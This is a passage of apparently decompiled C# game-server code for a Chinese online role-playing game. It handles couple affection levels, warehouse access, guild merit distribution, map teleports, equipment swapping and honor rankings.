				else if (base.FLD_情侣_爱情度 > 7203)
				{
					if (FLD_爱情度等级 == 6)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 5;
				}
				else if (base.FLD_情侣_爱情度 > 5042)
				{
					if (FLD_爱情度等级 == 7)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 6;
				}
				else if (base.FLD_情侣_爱情度 > 3025)
				{
					if (FLD_爱情度等级 == 8)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 7;
				}
				else if (base.FLD_情侣_爱情度 > 1513)
				{
					if (FLD_爱情度等级 == 9)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 8;
				}
				else if (base.FLD_情侣_爱情度 > 605)
				{
					if (FLD_爱情度等级 == 10)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 9;
				}
				else
				{
					FLD_爱情度等级 = 10;
				}
				if (players.FLD_情侣_爱情度 >= 35000)
				{
					players.FLD_情侣_爱情度 = 35000;
					players.FLD_爱情度等级 = 1;
				}
				else if (players.FLD_情侣_爱情度 > 30000)
				{
					if (players.FLD_爱情度等级 == 2)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 1;
				}
				else if (players.FLD_情侣_爱情度 > 21000)
				{
					if (players.FLD_爱情度等级 == 3)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 2;
				}
				else if (players.FLD_情侣_爱情度 > 14700)
				{
					if (players.FLD_爱情度等级 == 4)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 3;
				}
				else if (players.FLD_情侣_爱情度 > 10290)
				{
					if (players.FLD_爱情度等级 == 5)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 4;
				}
				else if (players.FLD_情侣_爱情度 > 7203)
				{
					if (players.FLD_爱情度等级 == 6)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 5;
				}
				else if (players.FLD_情侣_爱情度 > 5042)
				{
					if (players.FLD_爱情度等级 == 7)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 6;
				}
				else if (players.FLD_情侣_爱情度 > 3025)
				{
					if (players.FLD_爱情度等级 == 8)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 7;
				}
				else if (players.FLD_情侣_爱情度 > 1513)
				{
					if (players.FLD_爱情度等级 == 9)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 8;
				}
				else if (players.FLD_情侣_爱情度 > 605)
				{
					if (players.FLD_爱情度等级 == 10)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 9;
				}
				else
				{
					players.FLD_爱情度等级 = 10;
				}
				情侣提示(29, base.UserName, players.UserName);
				players.情侣提示(29, players.UserName, base.UserName);
				情侣提示(7, base.UserName, players.UserName);
				players.情侣提示(7, base.UserName, players.UserName);
				if (players.追加状态列表 != null)
				{
					if (players.GetAddState(1008001382))
					{
						players.追加状态列表[1008001382].时间结束事件();
					}
					if (players.GetAddState(1008001383))
					{
						players.追加状态列表[1008001383].时间结束事件();
					}
					if (players.GetAddState(1008001384))
					{
						players.追加状态列表[1008001384].时间结束事件();
					}
					if (players.GetAddState(1008001385))
					{
						players.追加状态列表[1008001385].时间结束事件();
					}
				}
				else
				{
					players.追加状态列表 = new ThreadSafeDictionary<int, 追加状态类>();
				}
				int num6 = World.挂机奖励时间周期 * 1000 * 60;
				int 时间;
				players.状态效果(BitConverter.GetBytes(num), 1, 时间 = num6 + 3000);
				追加状态类 追加状态类 = new 追加状态类(players, 时间, num, 0);
				players.追加状态列表.Add(追加状态类.FLD_PID, 追加状态类);
				switch (players.FLD_爱情度等级)
				{
				case 1:
				{
					players.人物追加最大_HP += 150;
					players.FLD_人物_追加_攻击 += 15;
					players.FLD_人物_追加_防御 += 15;
					int num7 = ++players.FLD_人物_追加_气功;
					players.FLD_人物_追加_经验百分比 += 0.05;
					players.更新气功();
					break;
				}
				case 2:
				{
					players.人物追加最大_HP += 150;
					players.FLD_人物_追加_攻击 += 15;
					players.FLD_人物_追加_防御 += 15;
					int num7 = ++players.FLD_人物_追加_气功;
					players.更新气功();
					break;
				}
				case 3:
					players.人物追加最大_HP += 150;
					players.FLD_人物_追加_攻击 += 15;
					players.FLD_人物_追加_防御 += 15;
					break;
				case 4:
					players.人物追加最大_HP += 150;
					players.FLD_人物_追加_攻击 += 10;
					players.FLD_人物_追加_防御 += 10;
					break;
				case 5:
					players.人物追加最大_HP += 150;
					players.FLD_人物_追加_攻击 += 10;
					players.FLD_人物_追加_防御 += 5;
					break;
				case 6:
					players.人物追加最大_HP += 150;
					players.FLD_人物_追加_攻击 += 5;
					players.FLD_人物_追加_防御 += 5;
					break;
				case 7:
					players.人物追加最大_HP += 150;
					players.FLD_人物_追加_攻击 += 5;
					break;
				case 8:
					players.人物追加最大_HP += 150;
					break;
				case 9:
					players.人物追加最大_HP += 100;
					break;
				case 10:
					players.人物追加最大_HP += 50;
					break;
				}
				更新情侣系统(2, players.UserName, 婚戒刻字, 解除关系倒计时, DateTime.Now);
				players.更新情侣系统(2, base.UserName, players.婚戒刻字, players.解除关系倒计时, DateTime.Now);
				players.更新武功和状态();
				players.更新HP_MP_SP();
			}
			else
			{
				情侣提示(18, base.UserName, base.FLD_情侣);
			}
		}

		public void 仓库药店(byte[] 封包数据, int length)
		{
			if (base.人物_HP <= 0 || base.Player死亡 || 退出中 || 交易.交易中 || 打开仓库中 || 进店中 || 个人商店 != null)
			{
				return;
			}
			封包修改(封包数据, length);
			switch (封包数据[11])
			{
			case 1:
				if (base.Player_Money >= 1000000L)
				{
					base.Player_Money -= 1000000L;
					更新金钱和负重();
					打开商店(1, 1, 0);
					break;
				}
				系统提示("游戏币不够了,每次使用随身仓库需支付100万手续费。");
				return;
			case 0:
				打开商店(3, 1, 0);
				break;
			}
			byte[] array = Converter.hexStringToByte("AA5513002C01BE0005000201000000000000000000000055AA");
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 领取门派财产(byte[] 封包数据, int length)
		{
			封包修改(封包数据, length);
			BitConverter.ToInt64(封包数据, 14);
		}

		public void 分配门派武勋(byte[] 封包数据, int length)
		{
			封包修改(封包数据, length);
			int num = Buffer.ToInt32(封包数据, 14);
			if (num < 0)
			{
				return;
			}
			int num2 = Buffer.ToInt32(封包数据, 18);
			byte[] array = new byte[14];
			System.Buffer.BlockCopy(封包数据, 22, array, 0, 14);
			Players players = 得到人物数据(Encoding.Default.GetString(array).Replace("\0", string.Empty).Trim());
			if (players != null)
			{
				DataTable dataTable = RxjhClass.得到帮派数据(base.帮派名字);
				if (dataTable != null)
				{
					int num3 = int.Parse(dataTable.Rows[0]["门派武勋"].ToString());
					if (num3 < num)
					{
						系统提示("门派武勋值不足。");
						return;
					}
					int num4 = num3 - num;
					players.Player_WuXun += num;
					players.更新武功和状态();
					DBA.ExeSqlCommand(string.Format("UPDATE      TBL_XWWL_Guild      SET      门派武勋={1}      WHERE      ID={0}", num2, num4));
					查帮派();
					系统提示("门派武勋分配成功。");
					players.系统提示("得到帮主[" + base.UserName + "]分配门派武勋" + num + "。");
					dataTable.Dispose();
				}
			}
			else
			{
				系统提示("对方不在线。");
			}
		}

		public void 移动修炼之地(byte[] data, int length)
		{
			封包修改(data, length);
			try
			{
				封包修改(data, length);
				byte[] array = new byte[4];
				int num = data[10];
				System.Buffer.BlockCopy(data, 14, array, 0, 4);
				int num2 = BitConverter.ToInt32(array, 0);
				switch (num)
				{
				case 8:
					if (num2 == 32002)
					{
						int int_ = -1;
						int num3 = 0;
						if (活动地图剩余时间 <= 0)
						{
							活动地图剩余时间 = 0;
							for (int i = 0; i < 66; i++)
							{
								int num4 = BitConverter.ToInt32(装备栏包裹[i].物品ID, 0);
								switch (num4)
								{
								default:
									continue;
								case 1008001328:
									num3 = num4;
									int_ = i;
									break;
								case 1008001182:
									num3 = num4;
									int_ = i;
									break;
								case 1008001183:
									num3 = num4;
									int_ = i;
									break;
								case 1008001184:
									num3 = num4;
									int_ = i;
									break;
								}
								break;
							}
							switch (num3)
							{
							case 1008001328:
								活动地图剩余时间 = 120;
								break;
							case 1008001182:
								活动地图剩余时间 = 240;
								break;
							case 1008001183:
								活动地图剩余时间 = 480;
								break;
							case 1008001184:
								活动地图剩余时间 = 1440;
								break;
							case 0:
								系统提示("背包需要携带[遗忘村庄入场券]才可进入遗忘村庄。");
								return;
							}
							物品使用(1, int_, 1);
						}
						int num5 = BitConverter.ToInt16(data, 13);
						float x = 0f;
						float y = 0f;
						switch (num5)
						{
						case 1:
							x = -1520f;
							y = 1248f;
							break;
						case 2:
							x = -1520f;
							y = -1248f;
							break;
						case 3:
							x = 1280f;
							y = 1248f;
							break;
						case 4:
							x = 1280f;
							y = -1260f;
							break;
						}
						移动(x, y, 15f, num2);
						FBtime = DateTime.Now;
						byte[] array3 = Converter.hexStringToByte("AA551E0000009100100001000000010000000100000000000000000000000000000055AA");
						打开仓库中 = false;
						System.Buffer.BlockCopy(BitConverter.GetBytes(1010), 0, array3, 18, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array3, array3.Length);
						}
						系统提示("开始计时,[" + 活动地图剩余时间 + "]分钟后自动传送出遗忘村庄。");
					}
					else if (World.修炼之地开启ID == 0)
					{
						int int_2 = -1;
						int num6 = 0;
						if (修炼地图剩余时间 <= 0)
						{
							修炼地图剩余时间 = 0;
							for (int j = 0; j < 66; j++)
							{
								int num7 = BitConverter.ToInt32(装备栏包裹[j].物品ID, 0);
								switch (num7)
								{
								default:
									continue;
								case 1008001502:
									num6 = num7;
									int_2 = j;
									break;
								case 1008001503:
									num6 = num7;
									int_2 = j;
									break;
								case 1008001504:
									num6 = num7;
									int_2 = j;
									break;
								case 1008001327:
									num6 = num7;
									int_2 = j;
									break;
								case 1008001190:
									num6 = num7;
									int_2 = j;
									break;
								}
								break;
							}
							switch (num6)
							{
							case 1008001190:
								修炼地图剩余时间 = 120;
								break;
							case 0:
								系统提示("背包需要携带[修炼之门入场券]才可进入。");
								return;
							case 1008001502:
								修炼地图剩余时间 = 240;
								break;
							case 1008001503:
								修炼地图剩余时间 = 480;
								break;
							case 1008001504:
								修炼地图剩余时间 = 1440;
								break;
							case 1008001327:
								修炼地图剩余时间 = 120;
								break;
							}
							物品使用(1, int_2, 1);
						}
						移动(0f, 0f, 15f, num2);
						FBtime = DateTime.Now;
						byte[] array4 = Converter.hexStringToByte("AA551E0000009100100001000000010000000100000000000000000000000000000055AA");
						打开仓库中 = false;
						System.Buffer.BlockCopy(BitConverter.GetBytes(1010), 0, array4, 18, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array4, 10, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array4, 14, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array4, array4.Length);
						}
						系统提示("修炼开始计时,[" + 修炼地图剩余时间 + "]分钟后自动传送出修炼之地。");
					}
					else
					{
						if (修炼地图剩余时间 < 0)
						{
							修炼地图剩余时间 = 0;
						}
						修炼地图剩余时间 += 120;
						移动(0f, 0f, 15f, num2);
						FBtime = DateTime.Now;
						byte[] array5 = Converter.hexStringToByte("AA551E0000009100100001000000010000000100000000000000000000000000000055AA");
						打开仓库中 = false;
						System.Buffer.BlockCopy(BitConverter.GetBytes(1010), 0, array5, 18, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array5, 10, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array5, 14, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array5, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array5, array5.Length);
						}
						系统提示("修炼开始计时," + 修炼地图剩余时间 + "分钟后自动传送出修炼之地。");
					}
					获取复查范围玩家();
					获取复查范围Npc();
					获取复查范围地面物品();
					break;
				case 3:
				{
					if (追加状态列表.ContainsKey(1008002169))
					{
						移动(-422f, -960f, 15f, 42101);
					}
					else
					{
						系统提示("需要拥有BUFF才能进入！");
					}
					byte[] array2 = Converter.hexStringToByte("AA551E0000009100100001000000010000000100000000000000000000000000000055AA");
					打开仓库中 = false;
					System.Buffer.BlockCopy(BitConverter.GetBytes(1010), 0, array2, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array2, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array2, 14, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array2, array2.Length);
					}
					break;
				}
				}
			}
			catch (Exception)
			{
			}
		}

		public void 参加王者之战(byte[] data, int length)
		{
			封包修改(data, length);
			Buffer.ToInt32(data, 11);
		}

		public void 更换辅助装备()
		{
			try
			{
				int num = 100;
				if (退出中)
				{
					Form1.WriteLine(6, "退出复制BUG      [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "]      ");
				}
				else if (!打开仓库中 && (个人商店 == null || !个人商店.个人商店是否开启))
				{
					for (int i = 0; i < 14; i++)
					{
						if (Buffer.ToInt32(辅助装备栏装备[i].物品ID, 0) != 0)
						{
							byte[] 物品_byte = new byte[World.数据库单个物品大小];
							物品类 物品类 = 辅助装备栏装备[i];
							if (Buffer.ToInt32(物品类.物品ID, 0) != 0 && !物品类.锁定)
							{
								ItmeClass itmeClass = World.Itme[Buffer.ToInt32(辅助装备栏装备[i].物品ID, 0)];
								if (itmeClass.FLD_LEVEL <= base.Player_Level && (itmeClass.FLD_ZX == 0 || itmeClass.FLD_ZX == base.Player_Zx) && (itmeClass.FLD_RESIDE1 == 0 || itmeClass.FLD_RESIDE1 == base.Player_Job) && (itmeClass.FLD_JOB_LEVEL == 0 || itmeClass.FLD_JOB_LEVEL <= base.Player_Job_leve) && (itmeClass.FLD_SEX == 0 || itmeClass.FLD_SEX == base.Player_Sex) && (itmeClass.FLD_XWJD < 1 || itmeClass.FLD_XWJD <= base.武勋阶段) && itmeClass.FLD_RESIDE2 >= 1 && itmeClass.FLD_RESIDE2 <= 15 && (i != 13 || 检查门甲条件(itmeClass.FLD_PID)))
								{
									if (Buffer.ToInt32(装备栏已穿装备[i].物品ID, 0) == 0)
									{
										装备栏已穿装备[i].物品_byte = 辅助装备栏装备[i].物品_byte;
										辅助装备栏装备[i].物品_byte = 物品_byte;
										更换装备位置(123, i, 0, i, 装备栏已穿装备[i].物品_byte, Buffer.ToInt32(装备栏已穿装备[i].物品数量, 0));
									}
									else
									{
										byte[] 物品_byte2 = 装备栏已穿装备[i].物品_byte;
										装备栏已穿装备[i].物品_byte = 辅助装备栏装备[i].物品_byte;
										辅助装备栏装备[i].物品_byte = 物品_byte2;
										更换装备位置(123, i, 0, i, 装备栏已穿装备[i].物品_byte, Buffer.ToInt32(装备栏已穿装备[i].物品数量, 0));
									}
									num += 100;
									Thread.Sleep(num);
								}
							}
						}
					}
					更新人物数据(this);
					更新装备效果();
					计算人物装备数据();
					更新武功和状态();
					更新HP_MP_SP();
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "更换装备出错      [" + base.Userid + "][" + base.UserName + "]      " + ex.Message);
			}
		}

		public void 辅助装备切换(byte[] data, int length)
		{
			封包修改(data, length);
			Thread thread = new Thread(更换辅助装备);
			thread.Name = "Timer      Thread";
			thread.Start();
		}

		public void 打开荣誉殿堂(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			int num = 封包数据[11];
			using (发包类 发包类 = new 发包类())
			{
				switch (封包数据[14])
				{
				case 2:
				case 3:
					switch (num)
					{
					default:
						if (World.门派排名数据.Count > 0)
						{
							发包类.Write4(World.门派排名数据.Count);
							发包类.Write(0);
							发包类.Write(num);
							发包类.Write2(0);
							发包类.Write4(1);
							for (int m = 0; m < World.门派排名数据.Count; m++)
							{
								if (World.门派排名数据[m] != null)
								{
									发包类.WriteName(World.门派排名数据[m].门派人物名);
									发包类.WriteName(World.门派排名数据[m].门派帮派名);
									发包类.Write2(World.门派排名数据[m].门派职业);
									发包类.Write2(0);
									发包类.Write2(World.门派排名数据[m].门派正邪);
									发包类.Write2(World.门派排名数据[m].门派人物等级);
									发包类.Write2(0);
									发包类.Write8(World.门派排名数据[m].门派荣誉点);
									发包类.Write8(m + 1);
								}
							}
							if (base.Client != null)
							{
								base.Client.SendPak(发包类, 23041, base.人物全服ID);
							}
						}
						else
						{
							发包类.Write4(World.门派排名数据.Count);
							发包类.Write(0);
							发包类.Write(num);
							发包类.Write2(0);
							发包类.Write4(1);
							发包类.WriteName("");
							发包类.WriteName("");
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write8(0L);
							发包类.Write8(0L);
							if (base.Client != null)
							{
								base.Client.SendPak(发包类, 23041, base.人物全服ID);
							}
						}
						break;
					case 2:
						if (World.武林血战排行数据.Count != 0)
						{
							发包类.Write4(World.武林血战排行数据.Count);
							发包类.Write(0);
							发包类.Write(num);
							发包类.Write2(0);
							发包类.Write4(1);
							for (int n = 0; n < World.武林血战排行数据.Count; n++)
							{
								if (World.武林血战排行数据[n] != null)
								{
									发包类.WriteName(World.武林血战排行数据[n].人物名);
									发包类.WriteName(World.武林血战排行数据[n].帮派);
									发包类.Write2(World.武林血战排行数据[n].职业);
									发包类.Write2(0);
									发包类.Write2(World.武林血战排行数据[n].势力);
									发包类.Write2(World.武林血战排行数据[n].等级);
									发包类.Write2(0);
									发包类.Write8(World.武林血战排行数据[n].分数);
									发包类.Write8(n + 1);
								}
							}
							if (base.Client != null)
							{
								base.Client.SendPak(发包类, 23041, base.人物全服ID);
							}
						}
						else
						{
							发包类.Write4(World.武林血战排行数据.Count);
							发包类.Write(0);
							发包类.Write(num);
							发包类.Write2(0);
							发包类.Write4(1);
							发包类.WriteName("");
							发包类.WriteName("");
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write8(0L);
							发包类.Write8(0L);
							if (base.Client != null)
							{
								base.Client.SendPak(发包类, 23041, base.人物全服ID);
							}
						}
						break;
					case 0:
					case 1:
						if (World.势力战排行数据.Count != 0)
						{
							发包类.Write4(World.势力战排行数据.Count);
							发包类.Write(0);
							发包类.Write(num);
							发包类.Write2(0);
							发包类.Write4(1);
							for (int l = 0; l < World.势力战排行数据.Count; l++)
							{
								if (World.势力战排行数据[l] != null)
								{
									发包类.WriteName(World.势力战排行数据[l].人物名);
									发包类.WriteName(World.势力战排行数据[l].帮派);
									发包类.Write2(World.势力战排行数据[l].职业);
									发包类.Write2(0);
									发包类.Write2(World.势力战排行数据[l].势力);
									发包类.Write2(World.势力战排行数据[l].等级);
									发包类.Write2(0);
									发包类.Write8(World.势力战排行数据[l].分数);
									发包类.Write8(l + 1);
								}
							}
							if (base.Client != null)
							{
								base.Client.SendPak(发包类, 23041, base.人物全服ID);
							}
						}
						else
						{
							发包类.Write4(World.势力战排行数据.Count);
							发包类.Write(0);
							发包类.Write(num);
							发包类.Write2(0);
							发包类.Write4(num);
							发包类.WriteName("");
							发包类.WriteName("");
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write8(0L);
							发包类.Write8(0L);
							if (base.Client != null)
							{
								base.Client.SendPak(发包类, 23041, base.人物全服ID);
							}
						}
						break;
					}
					break;
				case 1:
					switch (num)
					{
					default:
						if (World.门派排名数据.Count != 0)
						{
							发包类.Write4(World.门派排名数据.Count);
							发包类.Write(0);
							发包类.Write(num);
							发包类.Write2(0);
							发包类.Write4(1);
							for (int j = 0; j < World.门派排名数据.Count; j++)
							{
								if (World.门派排名数据[j] != null)
								{
									发包类.WriteName(World.门派排名数据[j].门派人物名);
									发包类.WriteName(World.门派排名数据[j].门派帮派名);
									发包类.Write2(World.门派排名数据[j].门派职业);
									发包类.Write2(0);
									发包类.Write2(World.门派排名数据[j].门派正邪);
									发包类.Write2(World.门派排名数据[j].门派人物等级);
									发包类.Write2(0);
									发包类.Write8(World.门派排名数据[j].门派荣誉点);
									发包类.Write8(j + 1);
								}
							}
							if (base.Client != null)
							{
								base.Client.SendPak(发包类, 23041, base.人物全服ID);
							}
						}
						else
						{
							发包类.Write4(World.门派排名数据.Count);
							发包类.Write(0);
							发包类.Write(num);
							发包类.Write2(0);
							发包类.Write4(1);
							发包类.WriteName("");
							发包类.WriteName("");
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write8(0L);
							发包类.Write8(0L);
							if (base.Client != null)
							{
								base.Client.SendPak(发包类, 23041, base.人物全服ID);
							}
						}
						break;
					case 2:
						if (World.武林血战排行数据.Count != 0)
						{
							发包类.Write4(World.武林血战排行数据.Count);
							发包类.Write(0);
							发包类.Write(num);
							发包类.Write2(0);
							发包类.Write4(1);
							for (int k = 0; k < World.武林血战排行数据.Count; k++)
							{
								if (World.武林血战排行数据[k] != null)
								{
									发包类.WriteName(World.武林血战排行数据[k].人物名);
									发包类.WriteName(World.武林血战排行数据[k].帮派);
									发包类.Write2(World.武林血战排行数据[k].职业);
									发包类.Write2(0);
									发包类.Write2(World.武林血战排行数据[k].势力);
									发包类.Write2(World.武林血战排行数据[k].等级);
									发包类.Write2(0);
									发包类.Write8(World.武林血战排行数据[k].分数);
									发包类.Write8(k + 1);
								}
							}
							if (base.Client != null)
							{
								base.Client.SendPak(发包类, 23041, base.人物全服ID);
							}
						}
						else
						{
							发包类.Write4(World.武林血战排行数据.Count);
							发包类.Write(0);
							发包类.Write(num);
							发包类.Write2(0);
							发包类.Write4(1);
							发包类.WriteName("");
							发包类.WriteName("");
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write8(0L);
							发包类.Write8(0L);
							if (base.Client != null)
							{
								base.Client.SendPak(发包类, 23041, base.人物全服ID);
							}
						}
						break;
					case 0:
					case 1:
						if (World.势力战排行数据.Count != 0)
						{
							发包类.Write4(World.势力战排行数据.Count);
							发包类.Write(0);
							发包类.Write(num);
							发包类.Write2(0);
							发包类.Write4(1);
							for (int i = 0; i < World.势力战排行数据.Count; i++)
							{
								if (World.势力战排行数据[i] != null)
								{
									发包类.WriteName(World.势力战排行数据[i].人物名);
									发包类.WriteName(World.势力战排行数据[i].帮派);
									发包类.Write2(World.势力战排行数据[i].职业);
									发包类.Write2(0);
									发包类.Write2(World.势力战排行数据[i].势力);
									发包类.Write2(World.势力战排行数据[i].等级);
									发包类.Write2(0);
									发包类.Write8(World.势力战排行数据[i].分数);
									发包类.Write8(i + 1);
								}
							}
							if (base.Client != null)
							{
								base.Client.SendPak(发包类, 23041, base.人物全服ID);
							}
						}
						else
						{
							发包类.Write4(World.势力战排行数据.Count);
							发包类.Write(0);
							发包类.Write(num);
							发包类.Write2(0);
							发包类.Write4(1);
							发包类.WriteName("");
							发包类.WriteName("");
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write2(0);
							发包类.Write8(0L);
							发包类.Write8(0L);
							if (base.Client != null)
							{
								base.Client.SendPak(发包类, 23041, base.人物全服ID);
							}
						}
						break;
					}
					break;
				}
			}
		}

		public void 荣誉排行前三名(byte[] 封包数据, int 封包大小)
		{
			int num = 封包数据[11];
			发包类 发包类 = new 发包类();
			new 发包类();
			new 发包类();
			new 发包类();
			switch (num)
			{
			case 1:
			{
				for (int j = 0; j < World.势力战排行数据.Count && j <= 3; j++)
				{
					switch (j)
					{
					case 2:
						if (World.势力战排行数据[j].人物名 != null)
						{
							byte[] array5 = 得到更新人物排名数据(World.势力战排行数据[j].人物名, World.势力战排行数据[j].帮派, World.势力战排行数据[j].势力, World.势力战排行数据[j].等级, World.势力战排行数据[j].职业, 0, 3).ToArray3();
							发包类.Write(array5, 0, array5.Length);
						}
						break;
					case 1:
						if (World.势力战排行数据[j].人物名 != null)
						{
							byte[] array6 = 得到更新人物排名数据(World.势力战排行数据[j].人物名, World.势力战排行数据[j].帮派, World.势力战排行数据[j].势力, World.势力战排行数据[j].等级, World.势力战排行数据[j].职业, 0, 2).ToArray3();
							发包类.Write(array6, 0, array6.Length);
						}
						break;
					case 0:
						if (World.势力战排行数据[j].人物名 != null)
						{
							byte[] array4 = 得到更新人物排名数据(World.势力战排行数据[j].人物名, World.势力战排行数据[j].帮派, World.势力战排行数据[j].势力, World.势力战排行数据[j].等级, World.势力战排行数据[j].职业, 0, 1).ToArray3();
							发包类.Write(array4, 0, array4.Length);
						}
						break;
					}
				}
				break;
			}
			case 2:
			{
				for (int k = 0; k < World.武林血战排行数据.Count && k <= 3; k++)
				{
					switch (k)
					{
					case 2:
						if (World.武林血战排行数据[k].人物名 != null)
						{
							byte[] array8 = 得到更新人物排名数据(World.武林血战排行数据[k].人物名, World.武林血战排行数据[k].帮派, World.武林血战排行数据[k].势力, World.武林血战排行数据[k].等级, World.武林血战排行数据[k].职业, 0, 3).ToArray3();
							发包类.Write(array8, 0, array8.Length);
						}
						break;
					case 1:
						if (World.武林血战排行数据[k].人物名 != null)
						{
							byte[] array9 = 得到更新人物排名数据(World.武林血战排行数据[k].人物名, World.武林血战排行数据[k].帮派, World.武林血战排行数据[k].势力, World.武林血战排行数据[k].等级, World.武林血战排行数据[k].职业, 0, 2).ToArray3();
							发包类.Write(array9, 0, array9.Length);
						}
						break;
					case 0:
						if (World.武林血战排行数据[k].人物名 != null)
						{
							byte[] array7 = 得到更新人物排名数据(World.武林血战排行数据[k].人物名, World.武林血战排行数据[k].帮派, World.武林血战排行数据[k].势力, World.武林血战排行数据[k].等级, World.武林血战排行数据[k].职业, 0, 1).ToArray3();
							发包类.Write(array7, 0, array7.Length);
						}
						break;
					}
				}
				break;
			}
			case 3:
			{
				for (int i = 0; i < World.门派排名数据.Count && i <= 3; i++)
				{
					switch (i)
					{
					case 2:
						if (World.门派排名数据[i].门派人物名 != null)
						{
							byte[] array2 = 得到更新人物排名数据(World.门派排名数据[i].门派人物名, World.门派排名数据[i].门派帮派名, World.门派排名数据[i].门派正邪, World.门派排名数据[i].门派人物等级, World.门派排名数据[i].门派职业, World.门派排名数据[i].门派转职, 3).ToArray3();
							发包类.Write(array2, 0, array2.Length);
						}
						break;
					case 1:
						if (World.门派排名数据[i].门派人物名 != null)
						{
							byte[] array3 = 得到更新人物排名数据(World.门派排名数据[i].门派人物名, World.门派排名数据[i].门派帮派名, World.门派排名数据[i].门派正邪, World.门派排名数据[i].门派人物等级, World.门派排名数据[i].门派职业, World.门派排名数据[i].门派转职, 2).ToArray3();
							发包类.Write(array3, 0, array3.Length);
						}
						break;
					case 0:
						if (World.门派排名数据[i].门派人物名 != null)
						{
							byte[] array = 得到更新人物排名数据(World.门派排名数据[i].门派人物名, World.门派排名数据[i].门派帮派名, World.门派排名数据[i].门派正邪, World.门派排名数据[i].门派人物等级, World.门派排名数据[i].门派职业, World.门派排名数据[i].门派转职, 1).ToArray3();
							发包类.Write(array, 0, array.Length);
						}
						break;
					}
				}
				break;
			}
			}
			if (发包类 != null && base.Client != null)
			{
				base.Client.SendPak(发包类, 5635, base.人物全服ID);
			}
		}

		public void 增加物品Script(int 物品ID, int 空位, int 数量)
		{
			byte[] array = new byte[56];
			ItmeClass value;
			if (World.Itme.TryGetValue(物品ID, out value))
			{
				System.Buffer.BlockCopy(Buffer.GetBytes(value.FLD_MAGIC0), 0, array, 0, 4);
				System.Buffer.BlockCopy(Buffer.GetBytes(value.FLD_MAGIC1), 0, array, 4, 4);
				System.Buffer.BlockCopy(Buffer.GetBytes(value.FLD_MAGIC2), 0, array, 8, 4);
				System.Buffer.BlockCopy(Buffer.GetBytes(value.FLD_MAGIC3), 0, array, 12, 4);
				System.Buffer.BlockCopy(Buffer.GetBytes(value.FLD_MAGIC4), 0, array, 16, 4);
				增加物品2(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(物品ID), 空位, Buffer.GetBytes(数量), array);
			}
		}

		public bool CheckQuestItem(Dictionary<int, 阶段需要物品类> 需要物品)
		{
			try
			{
				foreach (阶段需要物品类 value in 需要物品.Values)
				{
					if (!CheckItem(value.物品ID, value.物品总数))
					{
						return false;
					}
				}
				return true;
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "检查任务需要物品出错--" + ex.Message);
				return false;
			}
		}

		public bool CheckItem(int 物品ID, int 物品数量)
		{
			bool result = false;
			ItmeClass value;
			if (World.Itme.TryGetValue(物品ID, out value))
			{
				if (value.FLD_QUESTITEM == 1)
				{
					for (int i = 0; i < 任务物品.Length; i++)
					{
						if (任务物品[i].物品ID == 物品ID && 任务物品[i].物品数量 >= 物品数量)
						{
							result = true;
						}
					}
				}
				else
				{
					switch (物品ID)
					{
					case 909000001:
						if (base.人物经验 >= 物品数量)
						{
							result = true;
